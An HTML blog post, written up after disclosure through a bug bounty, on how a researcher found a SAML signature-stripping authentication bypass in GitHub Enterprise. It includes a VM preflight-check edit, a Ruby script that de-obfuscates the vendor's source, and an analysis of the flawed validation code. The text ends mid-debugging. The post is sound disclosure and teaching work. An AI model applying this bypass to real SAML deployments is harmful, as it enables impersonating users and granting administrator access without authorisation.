@@ -1,0 +1,788 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <link href='//fonts.googleapis.com/css?family=Source+Sans+Pro:300,400,700,400italic' rel='stylesheet' type='text/css'>
+
+    <link rel="stylesheet" type="text/css" href="http://www.economyofmechanism.com/theme/stylesheet/style.min.css">
+
+  <link rel="stylesheet" type="text/css" href="http://www.economyofmechanism.com/theme/pygments/github.min.css">
+  <link rel="stylesheet" type="text/css" href="http://www.economyofmechanism.com/theme/font-awesome/css/font-awesome.min.css">
+
+
+    <link href="http://www.economyofmechanism.com/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="Economy of mechanism Atom">
+
+
+
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="HandheldFriendly" content="True" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="robots" content="index, follow" />
+
+
+<meta name="author" content="Ioannis Kakavas" />
+<meta name="description" content="Authentication bypass using vulnerabilities in the Github Enterprise SAML SP implementation" />
+<meta name="keywords" content="SAML, authentication, XSW">
+<meta property="og:site_name" content="Economy of mechanism"/>
+<meta property="og:title" content="The road to your codebase is paved with forged assertions"/>
+<meta property="og:description" content="Authentication bypass using vulnerabilities in the Github Enterprise SAML SP implementation"/>
+<meta property="og:locale" content="en_US"/>
+<meta property="og:url" content="http://www.economyofmechanism.com/github-saml.html"/>
+<meta property="og:type" content="article"/>
+<meta property="article:published_time" content="2017-03-13 00:00:00+02:00"/>
+<meta property="article:modified_time" content="2017-03-13 00:10:00+02:00"/>
+<meta property="article:author" content="http://www.economyofmechanism.com/author/ioannis-kakavas.html">
+<meta property="article:section" content="bounty"/>
+<meta property="article:tag" content="SAML"/>
+<meta property="article:tag" content="authentication"/>
+<meta property="article:tag" content="XSW"/>
+<meta property="og:image" content="">
+
+  <title>Economy of mechanism &ndash; The road to your codebase is paved with forged assertions</title>
+
+</head>
+<body>
+  <aside>
+    <div>
+      <a href="http://www.economyofmechanism.com">
+        <img src="http://www.economyofmechanism.com/theme/img/profile.png" alt="" title="">
+      </a>
+      <h1><a href="http://www.economyofmechanism.com"></a></h1>
+
+<p>Security is hard</p>
+      <nav>
+        <ul class="list">
+          <li><a href="http://www.economyofmechanism.com/pages/about.html#about">About</a></li>
+
+          <li><a href="http://www.geocreepy.com" target="_blank">geocreepy</a></li>
+        </ul>
+      </nav>
+
+      <ul class="social">
+        <li><a class="sc-twitter" href="https://twitter.com/ilektrojohn" target="_blank"><i class="fa fa-twitter"></i></a></li>
+        <li><a class="sc-github" href="https://github.com/jkakavas" target="_blank"><i class="fa fa-github"></i></a></li>
+        <li><a class="sc-linkedin" href="https://linkedin.com/in/jkakavas" target="_blank"><i class="fa fa-linkedin"></i></a></li>
+        <li><a class="sc-rss" href="//economyofmechanism.com/feeds/all.atom.xml" target="_blank"><i class="fa fa-rss"></i></a></li>
+      </ul>
+    </div>
+
+
+  </aside>
+  <main>
+
+    <nav>
+      <a href="http://www.economyofmechanism.com">    Home
+</a>
+
+      <a href="/archives.html">Archives</a>
+      <a href="/categories.html">Categories</a>
+      <a href="/tags.html">Tags</a>
+
+      <a href="http://www.economyofmechanism.com/feeds/all.atom.xml">    Atom
+</a>
+
+    </nav>
+
+<article class="single">
+  <header>
+    <h1 id="github-saml">The road to your codebase is paved with forged assertions</h1>
+    <p>
+          Posted on Δευ 13 Μάρτιος 2017 in <a href="http://www.economyofmechanism.com/category/bounty.html">bounty</a>
+
+
+    </p>
+  </header>
+
+
+  <div>
+    <div class="contents topic" id="navigation">
+<p class="topic-title first">Navigation</p>
+<ul class="simple">
+<li><a class="reference internal" href="#tl-dr" id="id3">TL;DR</a></li>
+<li><a class="reference internal" href="#introduction" id="id4">Introduction</a><ul>
+<li><a class="reference internal" href="#setting-up-the-test-environment" id="id5">Setting up the test environment</a></li>
+<li><a class="reference internal" href="#getting-the-source-code-of-the-saml-implementation" id="id6">Getting the source code of the SAML implementation</a></li>
+<li><a class="reference internal" href="#verifying-that-everything-works" id="id7">Verifying that everything works</a></li>
+</ul>
+</li>
+<li><a class="reference internal" href="#attacking-the-saml-sp-implementation" id="id8">Attacking the SAML SP Implementation</a><ul>
+<li><a class="reference internal" href="#signature-stripping" id="id9">Signature Stripping</a><ul>
+<li><a class="reference internal" href="#overview" id="id10">Overview</a></li>
+<li><a class="reference internal" href="#details" id="id11">Details</a></li>
+<li><a class="reference internal" href="#poc" id="id12">PoC</a></li>
+<li><a class="reference internal" href="#disclosure" id="id13">Disclosure</a></li>
+</ul>
+</li>
+<li><a class="reference internal" href="#xml-signature-wrapping-attacks" id="id14">XML Signature Wrapping Attacks</a><ul>
+<li><a class="reference internal" href="#poc-steps-to-reproduce" id="id15">PoC - Steps to reproduce</a></li>
+<li><a class="reference internal" href="#exploitability" id="id16">Exploitability</a></li>
+<li><a class="reference internal" href="#impact" id="id17">Impact</a></li>
+<li><a class="reference internal" href="#id1" id="id18">Disclosure</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a class="reference internal" href="#timeline" id="id19">Timeline</a></li>
+<li><a class="reference internal" href="#full-saml-implementation-assessment" id="id20">Full SAML Implementation Assessment</a></li>
+<li><a class="reference internal" href="#outro" id="id21">Outro</a></li>
+</ul>
+</div>
+<div class="section" id="tl-dr">
+<h2><a class="toc-backref" href="#id3">TL;DR</a></h2>
+<p>Two vulnerabilities were identified in the SAML Service Provider implementation of Github Enterprise edition that allowed for full authentication bypass. These vulnerabilities were reported to Github via their <a class="reference external" href="https://www.hackerone.com/github">bug bounty program in Hackerone</a> and mitigated.</p>
+</div>
+<div class="section" id="introduction">
+<h2><a class="toc-backref" href="#id4">Introduction</a></h2>
+<p>Github Enterprise allows to be configured for authentication <a class="reference external" href="https://help.github.com/enterprise/2.9/admin/guides/user-management/using-saml">using SAML</a> , acting as a SAML Service Provider for the Organization's on premises SAML Identity Provider. For a short introduction on SAML authentication feel free to take a look in my <a class="reference external" href="http://www.economyofmechanism.com/office365-authbypass.html#short-saml-introduction">previous post</a> and/or any of the following: <a class="reference external" href="https://en.wikipedia.org/wiki/SAML_2.0#Web_Browser_SSO_Profile">wikipedia</a>, <a class="reference external" href="https://developers.onelogin.com/saml">onelogin saml tutorial</a>, <a class="reference external" href="https://auth0.com/blog/how-saml-authentication-works/">auth0 saml how-to</a>.</p>
+<p>Ever since I heard that Github supported SAML authentication for it's Enterprise edition, I made a mental note to come back an take a look. I was curious about what I might find but because of Github being Github, I didn't expect to uncover anything significant and I gradually forgot about it. Fast forward to this January when <a class="reference external" href="https://twitter.com/orange_8361">Orange Tsai</a> posted their cool <a class="reference external" href="http://blog.orange.tw/2017/01/bug-bounty-github-enterprise-sql-injection.html">writeup</a> of the SQL injection vulnerability they discovered in GHE and <a class="reference external" href="https://twitter.com/github/status/818548407987945473">this tweet</a> from <a class="reference external" href="https://twitter.com/GithubSecurity">Github Security</a> announcing that they will be giving out some bonuses on the vulnerabilities reported in January and February. Orange's writeup triggered my interest and the bounty bonus functioned as a nice incentive.</p>
+<p>This post describes what happened next. The focus will be on how I came about finding the vulnerabilities hoping that you can take something more out of reading this post, rather than just me &quot;bragging&quot; about what I found.</p>
+<div class="section" id="setting-up-the-test-environment">
+<h3><a class="toc-backref" href="#id5">Setting up the test environment</a></h3>
+<p>Failing to read the <a class="reference external" href="https://bounty.github.com/#open-bounties">documentation</a> properly, I didn't know that I could ask for a testing license from Github, so I went and registered for a normal business trial (Apologies to the friendly sales guy who tried to set up a call with me following that - I never had a legitimate interest in buying).</p>
+<p>I downloaded the qcow2 image, fired up a VM with 2 cpu and 4 GB ram, and.. nothing.</p>
+<div class="figure">
+<img alt="Firing up the VM" src="/images/ghe1.png" style="width: 50%;" />
+</div>
+<p>After navigating to <cite>https://192.168.122.244:8443/setup</cite> as instructed, I received the following message informing me that I would need 14 more GB of RAM at least to just bootstrap the installation.</p>
+<div class="figure">
+<img alt="Grounded by preflight checks" src="/images/ghe2.png" style="width: 50%;" />
+</div>
+<p>Thinking that I won't probably need all of this memory to just test out the SAML implementation, I focused on how to bypass the limitation. A quick search on how to mount and edit a qcow2 image pointed me to libguestfs and <a class="reference external" href="http://libguestfs.org/guestfish.1.html">guestfish</a>
+After successfully mounting the image, I did a quick search for 'preflight' and luckily enough I stumbled upon <cite>/usr/local/share/enterprise/ghe-preflight-check</cite> which contained all the limits. Changing</p>
+<pre class="code literal-block">
+CHECK_REQUIREMENTS = {¬
+  default: {memory: 14, blockdev_capacity: 10, rootdev_capacity: 20},¬
+}
+</pre>
+<p>to</p>
+<pre class="code literal-block">
+CHECK_REQUIREMENTS = {¬
+ default: {memory: 3, blockdev_capacity: 10, rootdev_capacity: 20},¬
+}
+</pre>
+<p>did the trick and I was able to start the VM.</p>
+</div>
+<div class="section" id="getting-the-source-code-of-the-saml-implementation">
+<h3><a class="toc-backref" href="#id6">Getting the source code of the SAML implementation</a></h3>
+<p>Building on what Orange had described in the write-up, I proceeded to <cite>scp</cite> the source code from <cite>/data/github/current</cite> to the host machine and used the following script</p>
+<pre class="code ruby literal-block">
+<span class="nb">require</span> <span class="s1">'zlib'</span>
+<span class="nb">require</span> <span class="s1">'fileutils'</span>
+
+<span class="k">def</span> <span class="nf">decrypt</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
+    <span class="n">key</span> <span class="o">=</span> <span class="s2">&quot;This obfuscation is intended to discourage GitHub Enterprise customers from making modifications to the VM. We know this 'encryption' is easily broken. &quot;</span>
+    <span class="n">i</span><span class="p">,</span> <span class="n">plaintext</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="s1">''</span>
+    <span class="no">Zlib</span><span class="o">::</span><span class="no">Inflate</span><span class="o">.</span><span class="n">inflate</span><span class="p">(</span><span class="n">s</span><span class="p">)</span><span class="o">.</span><span class="n">each_byte</span> <span class="k">do</span> <span class="o">|</span><span class="n">c</span><span class="o">|</span>
+        <span class="n">plaintext</span> <span class="o">&lt;&lt;</span> <span class="p">(</span><span class="n">c</span> <span class="o">^</span> <span class="n">key</span><span class="o">[</span><span class="n">i</span><span class="o">%</span><span class="n">key</span><span class="o">.</span><span class="n">length</span><span class="o">].</span><span class="n">ord</span><span class="p">)</span><span class="o">.</span><span class="n">chr</span>
+        <span class="n">i</span> <span class="o">+=</span> <span class="mi">1</span>
+    <span class="k">end</span>
+    <span class="n">plaintext</span>
+<span class="k">end</span>
+<span class="n">content</span> <span class="o">=</span> <span class="no">File</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="no">ARGV</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span><span class="p">,</span> <span class="s2">&quot;r&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span>
+<span class="n">filename</span> <span class="o">=</span> <span class="s1">'./decrypted_source/'</span><span class="o">+</span><span class="no">ARGV</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span>
+<span class="k">if</span> <span class="n">content</span><span class="o">.</span><span class="n">include?</span> <span class="s2">&quot;ruby_concealer.so&quot;</span>
+    <span class="n">content</span><span class="o">.</span><span class="n">sub!</span> <span class="sx">%Q(require &quot;ruby_concealer.so&quot;</span><span class="se">\n</span><span class="sx">__ruby_concealer__)</span><span class="p">,</span> <span class="s2">&quot; decrypt &quot;</span>
+    <span class="n">plaintext</span> <span class="o">=</span> <span class="nb">eval</span> <span class="n">content</span>
+
+    <span class="n">dirname</span> <span class="o">=</span> <span class="no">File</span><span class="o">.</span><span class="n">dirname</span><span class="p">(</span><span class="s1">'./decrypted_source/'</span><span class="o">+</span><span class="no">ARGV</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span><span class="p">)</span>
+    <span class="k">unless</span> <span class="no">File</span><span class="o">.</span><span class="n">directory?</span><span class="p">(</span><span class="n">dirname</span><span class="p">)</span>
+          <span class="no">FileUtils</span><span class="o">.</span><span class="n">mkdir_p</span><span class="p">(</span><span class="n">dirname</span><span class="p">)</span>
+    <span class="k">end</span>
+<span class="k">else</span>
+    <span class="n">plaintext</span> <span class="o">=</span> <span class="n">content</span>
+<span class="k">end</span>
+
+<span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span><span class="s1">'w'</span><span class="p">)</span> <span class="p">{</span> <span class="o">|</span><span class="n">f</span><span class="o">|</span>
+    <span class="n">f</span><span class="o">.</span><span class="n">puts</span> <span class="n">plaintext</span>
+<span class="p">}</span>
+</pre>
+<p>to de-obfuscate all ruby files with</p>
+<pre class="code literal-block">
+find . -iname '*.rb' -exec ruby decrypt.rb '{}' \;
+</pre>
+</div>
+<div class="section" id="verifying-that-everything-works">
+<h3><a class="toc-backref" href="#id7">Verifying that everything works</a></h3>
+<p>Setting up the SAML authentication was quite easy following the steps in <a class="reference external" href="https://help.github.com/enterprise/2.9/admin/guides/user-management/using-saml">the docs</a>. For the Identity Provider part, I am using a python project based on <a class="reference external" href="https://pypi.python.org/pypi/pysaml2">pysaml2</a> that can handle legitimate IdP functionality as well as a number of automated and semi-automated SAML related attacks. Hopefully it will be released soon and will be the topic of another blog post. I created a dummy IdP certificate</p>
+<pre class="code bash literal-block">
+openssl req -nodes -x509 -newkey rsa:2048 -keyout idp.key -out idp.crt -days <span class="m">3650</span>
+</pre>
+<p>and I set my Issuer to be <a class="reference external" href="https://idp.ikakavas.gr">https://idp.ikakavas.gr</a> and the authentication endpoint to <a class="reference external" href="https://idp.ikakavas.gr/sso/redirect">https://idp.ikakavas.gr/sso/redirect</a>. Note that the domain doesn't have to resolve to something, since all communication is front-channel via the user's browser, a simple entry in <cite>/etc/hosts</cite> pointing to localhost is sufficient for testing.
+I set up my Identity Provider to release a NameID with format <cite>urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified</cite> and I was ready to start testing.</p>
+<p>I did a test authentication releasing user1 as the NameID in the Subject of the SAML Assertion and verified that everything works as expected. The user was created in my GHE instance (it supports just in time provisioning) and I was successfully logged in.</p>
+<p>The flow is that of a normal SAML Web Browser Single Sign On.</p>
+<div class="figure">
+<img alt="SAML Web SSO flow" src="/images/ghe_saml_flow.png" style="width: 50%;" />
+</div>
+<ol class="arabic simple">
+<li>User attempts to access <a class="reference external" href="https://192.168.122.244">https://192.168.122.244</a></li>
+<li>Since SAML Authentication is enabled and access to the web interface is protected, GHE SAML SP builds an authentication request and redirects the user to the IdP Authentication endpoint with the Authentication Request deflated and urlencoded as a HTTP GET Parameter:</li>
+<li>The IdP validates the request and if it &quot;knows&quot; the Issuer proceeds to authenticate the user</li>
+<li>On successful authentication the IdP constructs a SAMLResponse containing an Assertion with an Authentication Statement and instructs the user browser to post that to the Assertion Consuming Service endpoint of the GHE SAML SP.</li>
+<li>The SAML Response's authenticity and validity is verified, the user is extracted from the NameID of the subject in the SAML Assertion and a session is created for them.</li>
+<li>The session cookie is set and the user is redirected back to <a class="reference external" href="https://192.168.122.244">https://192.168.122.244</a> as an authenticated user.</li>
+</ol>
+</div>
+</div>
+<div class="section" id="attacking-the-saml-sp-implementation">
+<h2><a class="toc-backref" href="#id8">Attacking the SAML SP Implementation</a></h2>
+<div class="section" id="signature-stripping">
+<h3><a class="toc-backref" href="#id9">Signature Stripping</a></h3>
+<div class="section" id="overview">
+<h4><a class="toc-backref" href="#id10">Overview</a></h4>
+<p>The first thing I tried was to disable signing the SAML Response and the SAML Assertion that my Identity Provider was sending to the GHE Service Provider. I did that more for due diligence so that I can move on to more promising test cases and almost couldn't believe it when the authentication succeeded.</p>
+<p>If you were too bored to refresh your SAML knowledge above, the equivalent of a Service Provider accepting unsigned SAML assertions is accepting a username without checking the password. Effectively on the flow described above, on step 5, GHE SAML SP accepted any SAML Assertion assuming it was well formed and valid without checking it's authenticity.</p>
+<p>So, in 30 mins time (counting the time it took to figure out how to run the VM with less than 14GB of RAM) I had a very serious bug in my hands. The impact of it was quite severe:</p>
+<ul class="simple">
+<li>An external or internal attacker would be able to authenticate as any existing user to a GHE instance.</li>
+<li>An external or internal attacker would be able to create arbitrary users in a given GHE instance, even with elevated privileges (<a class="reference external" href="https://help.github.com/enterprise/2.9/admin/guides/user-management/using-saml/#saml-attributes">setting the administrator attribute</a>)</li>
+<li>An internal attacker would be able to elevate their privileges by setting the administrator attribute to true for their account.</li>
+</ul>
+<p>The thing is that signature verification is a very fundamental part of SAML SSO and I was too surprised and intrigued that this was not checked at all. I had to submit a report in Hackerone, but first I needed to know why.</p>
+</div>
+<div class="section" id="details">
+<h4><a class="toc-backref" href="#id11">Details</a></h4>
+<p>A few greps later, I figured out that the SAML implementation is contained within the <cite>/data/github/current/lib/saml</cite> directory. Ruby is not my strong point but the code seemed straightforward enough. A quick grep for <cite>signature</cite> left me more perplexed than before as I could see that there are code paths to handle the verification of the Signatures in the SAML Response</p>
+<p>The verification process for an incoming SAML Response starts at <cite>/data/github/current/lib/github/authentication/saml.rb</cite> which deals with the HTTP POST request to the Assertion Consuming Service Endpoint and specifically in the <code class="rubyinline ruby"><span class="n">get_auth_failure_result</span></code> method</p>
+<pre class="code ruby literal-block">
+<span class="k">def</span> <span class="nf">get_auth_failure_result</span><span class="p">(</span><span class="n">saml_response</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">log_data</span><span class="p">)</span>
+  <span class="k">unless</span> <span class="n">saml_response</span><span class="o">.</span><span class="n">in_response_to</span> <span class="o">||</span> <span class="n">idp_initiated_sso?</span> <span class="o">||</span> <span class="o">::</span><span class="no">SAML</span><span class="o">.</span><span class="n">mocked</span><span class="o">[</span><span class="ss">:skip_in_response_to_check</span><span class="o">]</span>
+    <span class="k">return</span> <span class="no">GitHub</span><span class="o">::</span><span class="no">Authentication</span><span class="o">::</span><span class="no">Result</span><span class="o">.</span><span class="n">external_response_ignored</span>
+  <span class="k">end</span>
+  <span class="k">unless</span> <span class="n">saml_response</span><span class="o">.</span><span class="n">valid?</span><span class="p">(</span>
+    <span class="ss">:issuer</span> <span class="o">=&gt;</span> <span class="n">configuration</span><span class="o">[</span><span class="ss">:issuer</span><span class="o">]</span><span class="p">,</span>
+    <span class="ss">:idp_certificate</span> <span class="o">=&gt;</span> <span class="n">idp_certificate</span><span class="p">,</span>
+    <span class="ss">:sp_url</span> <span class="o">=&gt;</span> <span class="n">configuration</span><span class="o">[</span><span class="ss">:sp_url</span><span class="o">]</span>
+  <span class="p">)</span>
+    <span class="n">log_auth_validation_event</span><span class="p">(</span><span class="n">log_data</span><span class="p">,</span> <span class="s2">&quot;failure - Invalid SAML response&quot;</span><span class="p">,</span> <span class="n">saml_response</span><span class="p">,</span> <span class="n">request</span><span class="o">.</span><span class="n">params</span><span class="p">)</span>
+    <span class="k">return</span> <span class="no">GitHub</span><span class="o">::</span><span class="no">Authentication</span><span class="o">::</span><span class="no">Result</span><span class="o">.</span><span class="n">failure</span> <span class="ss">:message</span> <span class="o">=&gt;</span> <span class="no">INVALID_RESPONSE</span>
+  <span class="k">end</span>
+
+  <span class="k">if</span> <span class="n">saml_response</span><span class="o">.</span><span class="n">request_denied?</span>
+    <span class="n">log_auth_validation_event</span><span class="p">(</span><span class="n">log_data</span><span class="p">,</span> <span class="s2">&quot;failure - RequestDenied&quot;</span><span class="p">,</span> <span class="n">saml_response</span><span class="p">,</span> <span class="n">request</span><span class="o">.</span><span class="n">params</span><span class="p">)</span>
+    <span class="k">return</span> <span class="no">GitHub</span><span class="o">::</span><span class="no">Authentication</span><span class="o">::</span><span class="no">Result</span><span class="o">.</span><span class="n">failure</span> <span class="ss">:message</span> <span class="o">=&gt;</span> <span class="n">saml_response</span><span class="o">.</span><span class="n">status_message</span> <span class="o">||</span> <span class="no">REQUEST_DENIED_RESPONSE</span>
+  <span class="k">end</span>
+
+  <span class="k">unless</span> <span class="n">saml_response</span><span class="o">.</span><span class="n">success?</span>
+    <span class="n">log_auth_validation_event</span><span class="p">(</span><span class="n">log_data</span><span class="p">,</span> <span class="s2">&quot;failure - Unauthorized&quot;</span><span class="p">,</span> <span class="n">saml_response</span><span class="p">,</span> <span class="n">request</span><span class="o">.</span><span class="n">params</span><span class="p">)</span>
+    <span class="k">return</span> <span class="no">GitHub</span><span class="o">::</span><span class="no">Authentication</span><span class="o">::</span><span class="no">Result</span><span class="o">.</span><span class="n">failure</span> <span class="ss">:message</span> <span class="o">=&gt;</span> <span class="no">UNAUTHORIZED_RESPONSE</span>
+  <span class="k">end</span>
+
+  <span class="k">if</span> <span class="n">request_tracking?</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">in_response_to_request?</span><span class="p">(</span><span class="n">saml_response</span><span class="p">,</span> <span class="n">request</span><span class="p">)</span>
+    <span class="n">log_auth_validation_event</span><span class="p">(</span><span class="n">log_data</span><span class="p">,</span> <span class="s2">&quot;failure - Unauthorized - In Response To invalid&quot;</span><span class="p">,</span> <span class="n">saml_response</span><span class="p">,</span> <span class="n">request</span><span class="o">.</span><span class="n">params</span><span class="p">)</span>
+    <span class="k">return</span> <span class="no">GitHub</span><span class="o">::</span><span class="no">Authentication</span><span class="o">::</span><span class="no">Result</span><span class="o">.</span><span class="n">failure</span> <span class="ss">:message</span> <span class="o">=&gt;</span> <span class="no">UNAUTHORIZED_RESPONSE</span>
+  <span class="k">end</span>
+<span class="k">end</span>
+</pre>
+<p>The interesting part starts when <cite>valid?</cite> is called:</p>
+<pre class="code ruby literal-block">
+<span class="k">unless</span> <span class="n">saml_response</span><span class="o">.</span><span class="n">valid?</span><span class="p">(</span>
+  <span class="ss">:issuer</span> <span class="o">=&gt;</span> <span class="n">configuration</span><span class="o">[</span><span class="ss">:issuer</span><span class="o">]</span><span class="p">,</span>
+  <span class="ss">:idp_certificate</span> <span class="o">=&gt;</span> <span class="n">idp_certificate</span><span class="p">,</span>
+  <span class="ss">:sp_url</span> <span class="o">=&gt;</span> <span class="n">configuration</span><span class="o">[</span><span class="ss">:sp_url</span><span class="o">]</span>
+<span class="p">)</span>
+  <span class="n">log_auth_validation_event</span><span class="p">(</span><span class="n">log_data</span><span class="p">,</span> <span class="s2">&quot;failure - Invalid SAML response&quot;</span><span class="p">,</span> <span class="n">saml_response</span><span class="p">,</span> <span class="n">request</span><span class="o">.</span><span class="n">params</span><span class="p">)</span>
+  <span class="k">return</span> <span class="no">GitHub</span><span class="o">::</span><span class="no">Authentication</span><span class="o">::</span><span class="no">Result</span><span class="o">.</span><span class="n">failure</span> <span class="ss">:message</span> <span class="o">=&gt;</span> <span class="no">INVALID_RESPONSE</span>
+<span class="k">end</span>
+</pre>
+<p>The <cite>valid?</cite> method of <cite>saml_response</cite> actually calls <cite>validate</cite> from of the <cite>Message</cite> class (<cite>/lib/saml/message.rb</cite>)</p>
+<pre class="code ruby literal-block">
+<span class="c1"># Public: Validates schema and custom validations.</span>
+<span class="c1">#</span>
+<span class="c1"># Returns false if instance is invalid. #errors will be non-empty if</span>
+<span class="c1"># invalid.</span>
+<span class="k">def</span> <span class="nf">valid?</span><span class="p">(</span><span class="n">options</span> <span class="o">=</span> <span class="p">{})</span>
+  <span class="n">errors</span><span class="o">.</span><span class="n">clear</span>
+  <span class="n">validate_schema</span> <span class="o">&amp;&amp;</span> <span class="n">validate</span><span class="p">(</span><span class="n">options</span><span class="p">)</span>
+  <span class="n">errors</span><span class="o">.</span><span class="n">empty?</span>
+<span class="k">end</span>
+</pre>
+<p>and in turn <cite>validate</cite> method called above is implemented in <cite>Response</cite> class, that implements <cite>Message</cite> in <cite>/data/github/current/lib/saml/message/response.rb</cite></p>
+<pre class="code ruby literal-block">
+<span class="k">def</span> <span class="nf">validate</span><span class="p">(</span><span class="n">options</span><span class="p">)</span>
+    <span class="k">if</span> <span class="o">!</span><span class="no">SAML</span><span class="o">.</span><span class="n">mocked</span><span class="o">[</span><span class="ss">:skip_validate_signature</span><span class="o">]</span> <span class="o">&amp;&amp;</span> <span class="n">options</span><span class="o">[</span><span class="ss">:idp_certificate</span><span class="o">]</span>
+      <span class="n">validate_has_signature</span>
+      <span class="n">validate_signatures</span><span class="p">(</span><span class="n">options</span><span class="o">[</span><span class="ss">:idp_certificate</span><span class="o">]</span><span class="p">)</span>
+    <span class="k">end</span>
+    <span class="n">validate_issuer</span><span class="p">(</span><span class="n">options</span><span class="o">[</span><span class="ss">:issuer</span><span class="o">]</span><span class="p">)</span>
+    <span class="n">validate_destination</span><span class="p">(</span><span class="n">options</span><span class="o">[</span><span class="ss">:sp_url</span><span class="o">]</span><span class="p">)</span>
+    <span class="n">validate_recipient</span><span class="p">(</span><span class="n">options</span><span class="o">[</span><span class="ss">:sp_url</span><span class="o">]</span><span class="p">)</span>
+    <span class="n">validate_conditions</span>
+    <span class="n">validate_audience</span><span class="p">(</span><span class="n">options</span><span class="o">[</span><span class="ss">:sp_url</span><span class="o">]</span><span class="p">)</span>
+    <span class="n">validate_name_id_format</span><span class="p">(</span><span class="n">options</span><span class="o">[</span><span class="ss">:name_id_format</span><span class="o">]</span><span class="p">)</span>
+<span class="k">end</span>
+</pre>
+<p>So I ended here and I had no clear way of knowing whether <cite>validate_has_signature</cite> and <cite>validate_signatures</cite> where executed or not. <cite>SAML.mocked</cite> would need to have been set to true somewhere and this would affect everything which seemed rather improbable, and I was certain that the <cite>idp_certificate</cite> was set since one cannot complete the SAML configuration part in the admin UI without setting this.</p>
+<p>The only way to know was to debug the functionality, the way debugging was meant to be done: Print statements. Jokes aside, having limited exposure to Ruby and unicorn adding <cite>puts</cite> or <cite>pp</cite> statements was the easiest way for me to get some insights at that point.</p>
+<p>So I replaced the obfuscated code with the de-obfuscated version of <cite>/data/github/current/lib/saml/message/response.rb</cite> and changed the following</p>
+<pre class="code ruby literal-block">
+<span class="k">def</span> <span class="nf">validate</span><span class="p">(</span><span class="n">options</span><span class="p">)</span>
+    <span class="n">pp</span> <span class="n">options</span><span class="o">[</span><span class="ss">:idp_certificate</span><span class="o">]</span>
+    <span class="k">if</span> <span class="o">!</span><span class="no">SAML</span><span class="o">.</span><span class="n">mocked</span><span class="o">[</span><span class="ss">:skip_validate_signature</span><span class="o">]</span> <span class="o">&amp;&amp;</span> <span class="n">options</span><span class="o">[</span><span class="ss">:idp_certificate</span><span class="o">]</span>
+      <span class="nb">puts</span> <span class="s1">'Going to validate the signature'</span>
+      <span class="n">validate_has_signature</span>
+      <span class="n">validate_signatures</span><span class="p">(</span><span class="n">options</span><span class="o">[</span><span class="ss">:idp_certificate</span><span class="o">]</span><span class="p">)</span>
+    <span class="k">end</span>
+<span class="o">...</span>
+</pre>
+<p>Next I had to figure out what runs the ruby application, so that I would know which logs to check for for the output.</p>
+<p>I started of by seeing what listens on port 443 and figured out that it is haproxy that then passes on the request to nginx which then passes it to unicorn.
+Using <cite>systemctl list-units</cite> I then found that the name of the service is github-unicorn and from the <cite>data/github/current/config/unicorn.rb</cite> file the location of the log file at <cite>/var/log/githib/unicorn.log</cite></p>
+<p>Armed with the knowledge above, I restarted the service, performed an authentication and took a look at the log to see what's going on and saw the following:</p>
+<pre class="code ruby literal-block">
+<span class="p">{</span><span class="ss">:issuer</span><span class="o">=&gt;</span><span class="s2">&quot;https://idp.ikakavas.gr&quot;</span><span class="p">,</span>
+ <span class="ss">:idp_certificate</span><span class="o">=&gt;</span><span class="kp">nil</span><span class="p">,</span>
+ <span class="ss">:sp_url</span><span class="o">=&gt;</span><span class="s2">&quot;https://192.168.122.244&quot;</span><span class="p">}</span>
+</pre>
+<p>Since <cite>:idp_certificate</cite> was nil, <code class="rubyinline ruby"><span class="o">!</span><span class="no">SAML</span><span class="o">.</span><span class="n">mocked</span><span class="o">[</span><span class="ss">:skip_validate_signature</span><span class="o">]</span> <span class="o">&amp;&amp;</span> <span class="n">options</span><span class="o">[</span><span class="ss">:idp_certificate</span><span class="o">]</span></code> validated to false, and <cite>validate_has_signature</cite> and <cite>validate_signatures</cite> that would actually check the validity of the signatures were never executed!!</p>
+<p>Digging deeper to the source of the issue and the actual bug, I traced back to <cite>/data/github/current/lib/github/authentication/saml.rb</cite> where the <cite>valid</cite> is called</p>
+<pre class="code ruby literal-block">
+<span class="k">unless</span> <span class="n">saml_response</span><span class="o">.</span><span class="n">valid?</span><span class="p">(</span>
+  <span class="ss">:issuer</span> <span class="o">=&gt;</span> <span class="n">configuration</span><span class="o">[</span><span class="ss">:issuer</span><span class="o">]</span><span class="p">,</span>
+  <span class="ss">:idp_certificate</span> <span class="o">=&gt;</span> <span class="n">idp_certificate</span><span class="p">,</span>
+  <span class="ss">:sp_url</span> <span class="o">=&gt;</span> <span class="n">configuration</span><span class="o">[</span><span class="ss">:sp_url</span><span class="o">]</span>
+<span class="p">)</span>
+</pre>
+<p>and the method <cite>idp_certificate</cite>. It looks like this:</p>
+<pre class="code ruby literal-block">
+<span class="c1"># Public: Returns a string containing the IdP certificate or nil.</span>
+ <span class="k">def</span> <span class="nf">idp_certificate</span>
+   <span class="vi">&#64;idp_certificate</span> <span class="o">||=</span> <span class="k">if</span> <span class="n">configuration</span><span class="o">[</span><span class="ss">:idp_certificate</span><span class="o">]</span>
+     <span class="n">configuration</span><span class="o">[</span><span class="ss">:idp_certificate</span><span class="o">]</span>
+   <span class="k">elsif</span> <span class="n">configuration</span><span class="o">[</span><span class="ss">:idp_certificate_path</span><span class="o">]</span>
+     <span class="no">File</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="n">configuration</span><span class="o">[</span><span class="ss">:idp_certificate_path</span><span class="o">]</span><span class="p">)</span>
+   <span class="k">end</span>
+ <span class="k">end</span>
+</pre>
+<p>I kept staring at it, and nothing seemed off. I couldn't spot any error so &quot;puts to the rescue!&quot;
+A few minutes later (unicorn restart took quite some time with 4GB of RAM) I was looking at what the configuration Hash looked like</p>
+<pre class="code ruby literal-block">
